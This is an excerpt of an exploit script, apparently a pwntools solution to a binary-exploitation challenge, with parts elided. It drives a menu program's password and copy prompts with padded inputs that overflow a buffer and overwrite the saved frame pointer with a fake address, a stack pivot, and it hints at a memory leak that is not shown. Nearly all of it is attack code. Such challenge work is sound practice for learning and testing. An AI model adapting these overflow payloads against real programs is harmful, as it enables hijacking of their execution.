...
leak_content = b''
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :' , p8(0) )

p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*81 )
p.sendafter(b'>>',b'a')
p.sendafter(b'>>',b'a')
p.sendafter(b'>>',b'1')
...
p.sendafter(b'>>',b'1')
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'*(0x10 + 0x9 +0x8)  + p64(fake_rbp)  )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)
...
p.sendafter(b'>>',b'1')
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'*(0x10 + 0x9 )  + p64(fake_rbp)  )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)
